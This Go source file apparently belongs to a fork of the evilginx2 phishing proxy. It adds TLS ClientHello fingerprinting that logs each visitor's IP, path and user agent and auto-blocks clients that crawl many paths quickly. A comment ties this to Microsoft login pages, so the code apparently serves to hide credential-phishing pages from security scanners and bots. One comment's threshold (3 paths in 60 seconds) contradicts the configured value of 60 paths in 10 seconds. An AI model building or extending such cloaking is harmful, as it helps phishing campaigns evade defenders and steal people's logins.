package core

import (
	"bufio"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// TLS extension type constants
const (
	tlsExtSNI  uint16 = 0x0000
	tlsExtALPN uint16 = 0x0010
)

// ja4Visit tracks a single visit for behavioral analysis
type ja4Visit struct {
	path      string
	timestamp time.Time
}

// JA4Fingerprinter maintains a blocklist of known scanner/bot JA4 hashes,
// logs all fingerprints, and auto-blocks suspicious behavior.
type JA4Fingerprinter struct {
	blocklist     map[string]bool
	blocklistPath string
	logPath       string
	mu            sync.RWMutex

	// Auto-learning: track visits per JA4 for behavioral detection
	visits   map[string][]ja4Visit // ja4 -> list of recent visits
	visitsMu sync.Mutex

	// Config
	autoBlock         bool
	autoBlockThreshold int    // max unique paths within window before auto-block
	autoBlockWindow   time.Duration
}

// NewJA4Fingerprinter creates a new JA4Fingerprinter with auto-learning enabled.
func NewJA4Fingerprinter() *JA4Fingerprinter {
	return &JA4Fingerprinter{
		blocklist:          make(map[string]bool),
		visits:             make(map[string][]ja4Visit),
		autoBlock:          true,
		autoBlockThreshold: 60,                  // 60+ unique paths — browsers legitimately hit 20-40 paths loading MS login
		autoBlockWindow:    10 * time.Second,     // within 10 seconds (only catch rapid-fire scanners)
	}
}

// SetBlocklistPath sets the file path for persisting the blocklist.
func (j *JA4Fingerprinter) SetBlocklistPath(path string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.blocklistPath = path
}

// SetLogPath sets the file path for logging all fingerprints.
func (j *JA4Fingerprinter) SetLogPath(path string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.logPath = path
}

// SetAutoBlock enables/disables auto-blocking of scanner behavior.
func (j *JA4Fingerprinter) SetAutoBlock(enabled bool) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.autoBlock = enabled
}

// IsBlocked returns true if the given JA4 fingerprint is in the blocklist.
func (j *JA4Fingerprinter) IsBlocked(ja4 string) bool {
	j.mu.RLock()
	defer j.mu.RUnlock()
	return j.blocklist[ja4]
}

// AddToBlocklist adds a JA4 fingerprint to the blocklist in memory AND persists
// it to ja4_blocklist.txt (same pattern as blacklist.go AddToBlacklist).
func (j *JA4Fingerprinter) AddToBlocklist(ja4 string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	ja4 = strings.TrimSpace(ja4)
	if ja4 == "" {
		return
	}
	if j.blocklist[ja4] {
		return // already blocked
	}
	j.blocklist[ja4] = true
	log.Debug("ja4: auto-blocked fingerprint: %s", ja4)

	// Persist to file
	if j.blocklistPath != "" {
		f, err := os.OpenFile(j.blocklistPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err == nil {
			f.WriteString(ja4 + "\n")
			f.Close()
		}
	}
}

// LoadBlocklist reads JA4 fingerprints from a file (one per line) and adds them
// to the blocklist. Lines starting with '#' and empty lines are skipped.
func (j *JA4Fingerprinter) LoadBlocklist(path string) error {
	j.blocklistPath = path

	f, err := os.Open(path)
	if err != nil {
		// File doesn't exist yet — that's fine, it'll be created on first auto-block
		if os.IsNotExist(err) {
			return nil
		}
		return fmt.Errorf("ja4: failed to open blocklist: %w", err)
	}
	defer f.Close()

	count := 0
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		j.mu.Lock()
		j.blocklist[line] = true
		j.mu.Unlock()
		count++
	}

	if count > 0 {
		log.Info("ja4: loaded %d fingerprints from blocklist", count)
	}
	return scanner.Err()
}

// LogVisit records a visit for a JA4 fingerprint and checks for scanner behavior.
// Returns true if the fingerprint was auto-blocked.
// Scanner detection: if the same JA4 hits 3+ different URL paths within 60 seconds,
// it's a scanner probing the site — real humans don't do that.
func (j *JA4Fingerprinter) LogVisit(ja4, path, ip, userAgent string) bool {
	// Log to file (uses its own locking)
	j.logToFile(ja4, ip, userAgent, path)

	// Check autoBlock safely
	j.mu.RLock()
	autoBlock := j.autoBlock
	threshold := j.autoBlockThreshold
	window := j.autoBlockWindow
	j.mu.RUnlock()

	if !autoBlock {
		return false
	}

	// Skip common browser-generated paths from scanner detection
	// These are automatic requests that real browsers always make
	skipPaths := map[string]bool{
		"/favicon.ico":     true,
		"/robots.txt":      true,
		"/.well-known":     true,
		"/apple-touch-icon.png":             true,
		"/apple-touch-icon-precomposed.png": true,
	}
	if skipPaths[path] || strings.HasPrefix(path, "/.well-known/") {
		return false
	}

	j.visitsMu.Lock()

	now := time.Now()
	cutoff := now.Add(-window)

	// Clean old visits and add new one
	visits := j.visits[ja4]
	var recent []ja4Visit
	for _, v := range visits {
		if v.timestamp.After(cutoff) {
			recent = append(recent, v)
		}
	}
	recent = append(recent, ja4Visit{path: path, timestamp: now})
	j.visits[ja4] = recent

	// Count unique paths in the window
	uniquePaths := make(map[string]bool)
	for _, v := range recent {
		uniquePaths[v.path] = true
	}

	shouldBlock := len(uniquePaths) >= threshold
	if shouldBlock {
		delete(j.visits, ja4)
	}

	// Release visitsMu BEFORE calling AddToBlocklist (which locks mu)
	j.visitsMu.Unlock()

	if shouldBlock {
		log.Debug("ja4: scanner detected! %s hit %d unique paths in %v — auto-blocking",
			ja4, len(uniquePaths), window)
		j.AddToBlocklist(ja4)
		return true
	}

	return false
}

// logToFile appends a fingerprint entry to the JA4 log file.
func (j *JA4Fingerprinter) logToFile(ja4, ip, userAgent, path string) {
	j.mu.RLock()
	logPath := j.logPath
	j.mu.RUnlock()

	if logPath == "" {
		return
	}

	entry := fmt.Sprintf("[%s] ja4=%s ip=%s path=%s ua=%s\n",
		time.Now().UTC().Format("2006-01-02 15:04:05"),
		ja4, ip, path, userAgent)

	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err == nil {
		f.WriteString(entry)
		f.Close()
	}
}

// GetBlocklistCount returns the number of blocked fingerprints.
func (j *JA4Fingerprinter) GetBlocklistCount() int {
	j.mu.RLock()
	defer j.mu.RUnlock()
	return len(j.blocklist)
}

// GetStatus returns a human-readable status string.
func (j *JA4Fingerprinter) GetStatus() string {
	j.mu.RLock()
	blocked := len(j.blocklist)
	j.mu.RUnlock()

	j.visitsMu.Lock()
	tracked := len(j.visits)
	j.visitsMu.Unlock()

	autoStr := "off"
	if j.autoBlock {
		autoStr = fmt.Sprintf("on (threshold: %d paths in %v)", j.autoBlockThreshold, j.autoBlockWindow)
	}

	return fmt.Sprintf("blocked: %d, tracking: %d unique JA4s, auto-block: %s", blocked, tracked, autoStr)
}

// ParseClientHello parses a raw TLS ClientHello message and returns a JA4
// fingerprint string. The expected input is a complete TLS record starting
// with the 5-byte record header.
//
// Format: {tls_version}_{cipher_count}_{ext_count}_{alpn_first}_{hash}
func (j *JA4Fingerprinter) ParseClientHello(data []byte) string {
	// Minimum: 5 (record hdr) + 4 (handshake hdr) + 2 (version) + 32 (random) = 43
	if len(data) < 43 {
		return ""
	}

	// --- TLS Record Header (5 bytes) ---
	recordType := data[0]
	if recordType != 0x16 { // Handshake
		return ""
	}
	recordLen := int(binary.BigEndian.Uint16(data[3:5]))
	payload := data[5:]
	if len(payload) < 4 {
		return ""
	}
	_ = recordLen

	// --- Handshake Header (4 bytes) ---
	hsType := payload[0]
	if hsType != 0x01 { // ClientHello
		return ""
	}
	pos := 4

	if len(payload) < pos+2 {
		return ""
	}

	// --- ClientHello body ---
	// Client version (2 bytes)
	clientVersion := binary.BigEndian.Uint16(payload[pos : pos+2])
	pos += 2
	tlsVersionStr := tlsVersionToString(clientVersion)

	// Random (32 bytes)
	if len(payload) < pos+32 {
		return ""
	}
	pos += 32

	// Session ID (variable)
	if len(payload) < pos+1 {
		return ""
	}
	sessionIDLen := int(payload[pos])
	pos += 1
	if len(payload) < pos+sessionIDLen {
		return ""
	}
	pos += sessionIDLen

	// Cipher Suites (variable: 2-byte length prefix, then 2 bytes each)
	if len(payload) < pos+2 {
		return ""
	}
	cipherSuitesLen := int(binary.BigEndian.Uint16(payload[pos : pos+2]))
	pos += 2
	if len(payload) < pos+cipherSuitesLen {
		return ""
	}

	cipherSuites := make([]uint16, 0, cipherSuitesLen/2)
	for i := 0; i < cipherSuitesLen; i += 2 {
		cs := binary.BigEndian.Uint16(payload[pos+i : pos+i+2])
		if !isGREASE(cs) {
			cipherSuites = append(cipherSuites, cs)
		}
	}
	cipherCount := len(cipherSuites)
	pos += cipherSuitesLen

	// Compression methods (variable: 1-byte length prefix)
	if len(payload) < pos+1 {
		return ""
	}
	compLen := int(payload[pos])
	pos += 1
	if len(payload) < pos+compLen {
		return ""
	}
	pos += compLen

	// Extensions (variable: 2-byte length prefix)
	var extensionTypes []uint16
	alpnFirst := "00"

	if len(payload) >= pos+2 {
		extTotalLen := int(binary.BigEndian.Uint16(payload[pos : pos+2]))
		pos += 2

		extEnd := pos + extTotalLen
		if extEnd > len(payload) {
			extEnd = len(payload)
		}

		for pos+4 <= extEnd {
			extType := binary.BigEndian.Uint16(payload[pos : pos+2])
			extLen := int(binary.BigEndian.Uint16(payload[pos+2 : pos+4]))
			extDataStart := pos + 4
			extDataEnd := extDataStart + extLen

			if extDataEnd > extEnd {
				break
			}

			if !isGREASE(extType) {
				extensionTypes = append(extensionTypes, extType)
			}

			extData := payload[extDataStart:extDataEnd]

			if extType == tlsExtALPN {
				alpnFirst = parseALPNFirst(extData)
			}

			pos = extDataEnd
		}
	}

	extCount := len(extensionTypes)

	// Build hash input: cipher suites + extension types
	hashInput := ""
	for _, cs := range cipherSuites {
		hashInput += fmt.Sprintf("%04x", cs)
	}
	hashInput += "_"
	for _, et := range extensionTypes {
		hashInput += fmt.Sprintf("%04x", et)
	}

	h := sha256.Sum256([]byte(hashInput))
	hashHex := fmt.Sprintf("%x", h)
	if len(hashHex) > 12 {
		hashHex = hashHex[:12]
	}

	return fmt.Sprintf("%s_%d_%d_%s_%s", tlsVersionStr, cipherCount, extCount, alpnFirst, hashHex)
}

// --- Helper functions ---

func tlsVersionToString(v uint16) string {
	switch v {
	case 0x0301:
		return "t10"
	case 0x0302:
		return "t11"
	case 0x0303:
		return "t12"
	case 0x0304:
		return "t13"
	case 0x0300:
		return "s30"
	default:
		return fmt.Sprintf("t%02x", v&0xFF)
	}
}

func isGREASE(val uint16) bool {
	hi := val >> 8
	lo := val & 0xFF
	return hi == lo && lo&0x0F == 0x0A
}

func parseSNI(data []byte) string {
	if len(data) < 5 {
		return ""
	}
	nameType := data[2]
	nameLen := int(binary.BigEndian.Uint16(data[3:5]))
	if nameType != 0 {
		return ""
	}
	if len(data) < 5+nameLen {
		return ""
	}
	return string(data[5 : 5+nameLen])
}

func parseALPNFirst(data []byte) string {
	if len(data) < 4 {
		return "00"
	}
	protoLen := int(data[2])
	if len(data) < 3+protoLen || protoLen == 0 {
		return "00"
	}
	proto := string(data[3 : 3+protoLen])
	switch proto {
	case "h2":
		return "h2"
	case "http/1.1":
		return "h1"
	case "h3":
		return "h3"
	default:
		if len(proto) >= 2 {
			return proto[:2]
		}
		return proto
	}
}
